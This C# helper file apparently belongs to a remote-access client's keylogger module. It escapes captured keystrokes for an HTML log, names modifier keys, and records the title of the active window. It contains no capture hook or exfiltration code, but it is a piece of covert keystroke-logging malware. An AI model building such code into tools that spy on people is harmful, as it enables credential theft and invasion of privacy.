using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace xClient.Core.Keylogger
{
    public static class LoggerHelper
    {
        public static string Filter(this char key)
        {
            if ((int)key < 32) return string.Empty;

            switch (key)
            {
                case '<':
                    return "&lt;";
                case '>':
                    return "&gt;";
                case '#':
                    return "&#35;";
                case '&':
                    return "&amp;";
                case '"':
                    return "&quot;";
                case '\'':
                    return "&apos;";
                case ' ': // space is already proccessed by OnKeyDown
                    return string.Empty;
            }
            return key.ToString();
        }

        public static string GetDisplayName(string key)
        {
            if (key.Contains("ControlKey"))
                return "Control";
            else if (key.Contains("Menu"))
                return "Alt";
            else if (key.Contains("Win"))
                return "Win";
            else if (key.Contains("Shift"))
                return "Shift";
            return key;
        }

        public static string GetActiveWindowTitle()
        {
            StringBuilder sbTitle = new StringBuilder(1024);

            WinApi.ThreadNativeMethods.GetWindowText(WinApi.ThreadNativeMethods.GetForegroundWindow(), sbTitle,
                sbTitle.Capacity);

            string title = sbTitle.ToString();

            return (!string.IsNullOrEmpty(title)) ? title : null;
        }

        public static bool HasSetModifierKeys(this List<Keys> KeyCollection)
        {
            return KeyCollection.Any(KeyItem => (KeyItem == Keys.LControlKey) ||
                                                (KeyItem == Keys.RControlKey) ||
                                                (KeyItem == Keys.LMenu) ||
                                                (KeyItem == Keys.RMenu) ||
                                                (KeyItem == Keys.LWin) ||
                                                (KeyItem == Keys.RWin));
        }
    }
}